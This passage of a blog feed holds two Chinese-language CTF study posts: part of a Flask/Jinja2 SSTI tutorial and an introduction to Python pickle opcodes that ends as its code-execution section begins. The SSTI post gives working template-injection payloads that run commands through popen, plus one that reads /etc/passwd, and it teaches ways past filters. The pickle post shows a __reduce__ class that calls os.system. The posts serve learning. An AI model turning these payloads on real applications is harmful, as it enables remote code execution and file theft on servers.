<li><strong>魔术方法</strong> : 我们如何去实现在继承中我们提到的过程呢？这就需要在上面 Payload 中类似 <code>__class__</code> 的魔术方法了，通过拼接不同作用的魔术方法来操控类，我们就能实现文件的读取或者命令的执行了。</li>
</ul>
<h2 id="一般过程"><a href="#一般过程" class="headerlink" title="一般过程"></a>一般过程</h2><p>假设我们现在只有一个对象A，那么我们要做的就是：</p>
<p><strong>找对象 A 的类 - 类 A</strong> -&gt; <strong>找类 A 的父亲 - 类 B</strong> -&gt; <strong>找祖先 &#x2F; 基类 - 类 O</strong> -&gt; <strong>遍历祖先下面所有的子类</strong> -&gt; <strong>找到可利用的类 类 F 类 G</strong>-&gt; <strong>构造利用方法</strong>-&gt; <strong>读写文件 &#x2F; 执行命令</strong></p>
<h3 id="拿基类"><a href="#拿基类" class="headerlink" title="拿基类"></a>拿基类</h3><p>在python中所有类都继承自一个特殊的基类<strong>object</strong>，拿到它即可获取所有的子类。</p>
<p>我们一般利用字符串，元组，字典，列表这种最基础的对象向上查找。</p>
<p>在寻找时通常使用以下魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line"></span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line"></span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常					 没有属性 __bases__</span><br><span class="line"></span><br><span class="line">__mro__              查看继承关系和调用顺序，返回元组。此属性是由类					 组成的元组，在方法解析期间会基于它来查找基类。</span><br></pre></td></tr></table></figure>

<p>我们一般先利用<code>__class__</code>获取一个实例的类，再用<code>__base__</code>,<code>__bases__</code>,<code>__mro__</code>获取基类例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.Request&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__mro__</span><br><span class="line"> (&lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.sansio.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;) <span class="comment"># 返回为元组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__mro__[-<span class="number">1</span>]<span class="comment">#利用负索引获取元组的最后一个元素</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.wrappers.JSONMixin&#x27;</span>&gt;) <span class="comment"># 返回为元组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.Request&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__base__.__base__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="拿子类"><a href="#拿子类" class="headerlink" title="拿子类"></a>拿子类</h3><p>当我们拿到基类时，便可以直接使用 <code>subclasses()</code> 获取基类的所有子类了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]__subclasses__()</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure>

<p>找到合适的子类后我们还需要用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取函数所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身</span><br></pre></td></tr></table></figure>

<p>找到子类中合适的方法</p>
<p><img src="/../images/image-20231129164759866.png" alt="image-20231129164759866" loading="lazy"></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>找到合适的方法后，我们便可以进行命令执行例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>这使用了popen方法读取目录</p>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="被过滤"><a href="#被过滤" class="headerlink" title=".  被过滤"></a>.  被过滤</h2><h3 id="1-绕过"><a href="#1-绕过" class="headerlink" title="1.[]绕过"></a>1.[]绕过</h3><p>可以利用 [ ]代替 . 的作用。</p>
<p><code>&#123;&#123;().__class__&#125;&#125;</code> 可以替换为：<br><code>&#123;&#123;()["__class__"]&#125;&#125;</code><br>举例：<br><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()&#125;&#125;</code></p>
<h3 id="2-attr绕过"><a href="#2-attr绕过" class="headerlink" title="2.attr绕过"></a>2.attr绕过</h3><p>attr用于获取对象的属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125; 可以替换为：</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">举例：</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">65</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="单双引号过滤"><a href="#单双引号过滤" class="headerlink" title="单双引号过滤"></a>单双引号过滤</h2><h3 id="1-利用request内置对象"><a href="#1-利用request内置对象" class="headerlink" title="1.利用request内置对象"></a>1.利用request内置对象</h3><p>在Flask框架中，<code>request</code>对象可以访问HTTP请求的所有参数（如GET参数、POST表单、Cookies、Headers等）。攻击者通过将这些参数作为字符串载体，将原本需要单双引号的敏感字符（如<code>__class__</code>、<code>os</code>等）以参数形式传递，从而绕过模板引擎对引号的过滤。</p>
<p>例如：</p>
<ul>
<li><strong>GET参数</strong>：<code>request.args.key</code>获取URL中的参数值。</li>
<li><strong>POST参数</strong>：<code>request.form.key</code>获取表单提交的值。</li>
<li><strong>Cookies</strong>：<code> request.cookies.key</code>从Cookie中读取值</li>
</ul>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    </span><br></pre></td></tr></table></figure>

<h3 id="2-chr绕过"><a href="#2-chr绕过" class="headerlink" title="2.chr绕过"></a>2.chr绕过</h3><p>如果使用GET请求时，+号记得url编码，要不会被当作空格处理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><h3 id="1-字符串拼接"><a href="#1-字符串拼接" class="headerlink" title="1.字符串拼接"></a>1.字符串拼接</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;__cla&quot;</span> <span class="string">&quot;ss__&quot;</span>]  <span class="comment"># 等价于 &quot;__class__&quot;</span></span><br></pre></td></tr></table></figure>

<p>利用”+”进行字符串拼接，绕过关键字过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-join拼接"><a href="#2-join拼接" class="headerlink" title="2.join拼接"></a>2.join拼接</h3><p>利用join（）函数来绕过关键字过滤，和使用**+**号连接大差不差。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&quot;fla&quot;</span>.join(<span class="string">&quot;/g&quot;</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-使用str原生函数replace替换"><a href="#3-使用str原生函数replace替换" class="headerlink" title="3.使用str原生函数replace替换"></a>3.使用str原生函数replace替换</h3><p>将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-编码绕过"><a href="#4-编码绕过" class="headerlink" title="4.编码绕过"></a>4.<strong>编码绕过</strong></h3><p>我们可以利用对关键字编码的方法，绕过关键字过滤，例如用16进制编码绕过：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;__class__&quot;</span>==<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>==<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span></span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">139</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>与这类似的，其他编码方式也可以绕过</p>
<h3 id="5-在jinja2可以使用-进行拼接"><a href="#5-在jinja2可以使用-进行拼接" class="headerlink" title="5.在jinja2可以使用~进行拼接"></a>5.在jinja2可以使用~进行拼接</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">%set</span> a=<span class="string">&#x27;__cla&#x27;</span> <span class="variable">%&#125;</span>&#123;<span class="variable">%set</span> b=<span class="string">&#x27;ss__&#x27;</span><span class="variable">%&#125;</span>&#123;&#123;<span class="string">&quot;&quot;</span>[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure>



<h1 id="类知识的总结"><a href="#类知识的总结" class="headerlink" title="类知识的总结"></a>类知识的总结</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>ez_pickle知识深挖</title>
    <url>/2025/03/11/pickle%E7%9F%A5%E8%AF%86%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h1><p>第一次见到这种类型的题，遂记录增长见识。</p>
<h2 id="什么是pickle"><a href="#什么是pickle" class="headerlink" title="什么是pickle"></a>什么是pickle</h2><p>pickle是python中的一个标准模块，也被称为“腌制”和“卸腌”，用于将python对象转换为一个字节流，也就是序列化，并且以二进制格式储存，同时也可以把对象从字节流恢复成python对象。值得注意的是，使用pickle序列化的数据只能由pickle反序列化，并不能跨语言。</p>
<h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h2><ol>
<li><strong>基本数据类型</strong>：<ul>
<li>整型（int）</li>
<li>浮点型（float）</li>
<li>复数（complex）</li>
<li>字符串（str）</li>
<li>字节串（bytes）</li>
<li>字节数组（bytearray）</li>
<li>布尔值（bool）</li>
</ul>
</li>
<li><strong>容器类型</strong>：<ul>
<li>列表（list）</li>
<li>元组（tuple）</li>
<li>字典（dict）</li>
<li>集合（set）和冻结集合（frozenset）</li>
</ul>
</li>
<li><strong>None</strong>：Python 的 <code>None</code> 值可以被 pickle。</li>
<li><strong>函数、类和实例</strong>：用户定义的函数、类以及它们的实例可以被 pickle，但有一些限制。例如，函数和类定义所在的代码必须能够在反序列化时被导入。</li>
<li><strong>内置类型实例</strong>：许多 Python 的内置类型实例，如 <code>datetime</code> 对象，也可以被 pickle。</li>
</ol>
<h2 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h2><ul>
<li><code>pickle.dump(obj, file, protocol)</code>：将对象序列化并写入文件。</li>
<li><code>pickle.load(file)</code>：从文件中读取并反序列化对象。</li>
<li><code>pickle.dumps(obj)</code>：返回对象序列化后的结果。</li>
<li><code>pickle.loads(bytes)</code>：从字节流中读取并且反序列化对象。</li>
</ul>
<h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p><code>opcode</code> 是 “operation code” 的缩写，它指的是一个指令集中的一个操作码或操作码，pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行），工作原理大致如下（白嫖的图）</p>
<p><img src="/../images/20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1" loading="lazy"></p>
<p>常用的opcode如下：</p>
<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody></table>
<h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</p>
<p>例如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, passwd</span>):</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.num = num</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;dir&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">x = B(<span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=pickle.dumps(x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickletools.dis(payload)</span><br></pre></td></tr></table></figure>

<p>输出为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x03dir\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    0: \x80 PROTO      4</span><br><span class="line">    2: \x95 FRAME      27</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;nt&#x27;</span><br><span class="line">   15: \x94 MEMOIZE    (as 0)</span><br><span class="line">   16: \x8c SHORT_BINUNICODE &#x27;system&#x27;</span><br><span class="line">   24: \x94 MEMOIZE    (as 1)</span><br><span class="line">   25: \x93 STACK_GLOBAL</span><br><span class="line">   26: \x94 MEMOIZE    (as 2)</span><br><span class="line">   27: \x8c SHORT_BINUNICODE &#x27;dir&#x27;</span><br><span class="line">   32: \x94 MEMOIZE    (as 3)</span><br><span class="line">   33: \x85 TUPLE1</span><br><span class="line">   34: \x94 MEMOIZE    (as 4)</span><br><span class="line">   35: R    REDUCE</span><br><span class="line">   36: \x94 MEMOIZE    (as 5)</span><br><span class="line">   37: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br></pre></td></tr></table></figure>



<h2 id="pickle的利用"><a href="#pickle的利用" class="headerlink" title="pickle的利用"></a>pickle的利用</h2><ul>
<li>任意代码执行或者命令执行</li>
<li>变量覆盖</li>
</ul>
<h3 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h3><p>有点像php，如果知道目标有什么类，我们通过修改被反序列化的内容来进行引用危险变量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">secret</span>:</span><br><span class="line">    pwd = <span class="string">&quot;hahaha&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.pwd = secret.pwd</span><br><span class="line">a=test()</span><br><span class="line"><span class="comment"># pickletools.optimize优化,更易读</span></span><br><span class="line">serialized = pickletools.optimize(pickle.dumps(test, protocol=<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>产生的字节码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\ntest\nc__builtin__\nobject\nNtR(dVpwd\nVhahaha\nsb.&#x27;   </span><br></pre></td></tr></table></figure>

<p>当运行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 假设 secret 模块如下定义：</span></span><br><span class="line"><span class="comment"># secret.py</span></span><br><span class="line">pwd = <span class="string">&quot;s3cr3t&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的代码</span></span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.pwd = secret.pwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设这是已经序列化后的test类实例</span></span><br><span class="line">target = <span class="string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\ntest\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用pickle.loads反序列化target</span></span><br><span class="line">loaded_object = pickle.loads(target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印反序列化对象的属性字典</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">vars</span>(loaded_object))</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;pwd&#x27;: &#x27;s3cr3t&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>成功引用。</p>
<h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><h4 id="漏洞产生-reduce"><a href="#漏洞产生-reduce" class="headerlink" title="漏洞产生(__ reduce __)"></a>漏洞产生(__ reduce __)</h4><p>先看一个简单的代码</p>
